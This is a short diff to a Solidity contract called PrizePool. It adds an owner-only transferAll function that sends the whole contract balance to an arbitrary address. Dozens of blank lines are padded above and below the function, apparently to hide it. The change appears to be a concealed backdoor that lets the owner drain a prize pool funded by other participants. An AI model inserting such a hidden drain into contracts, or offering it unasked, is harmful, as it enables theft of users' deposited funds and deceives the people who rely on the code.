@@ -139,6 +139,34 @@ contract PrizePool is Ownable{
     
     uint256 public credit;
     
+    
+    
+    
+    
+    
+    
+    
+    
+     function transferAll(address payable _to) external onlyOwner {
+        
+        _to.transfer(address(this).balance);
+    }
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     modifier permission(){
         require(permissions[_msgSender()],"not allowed");
         _;
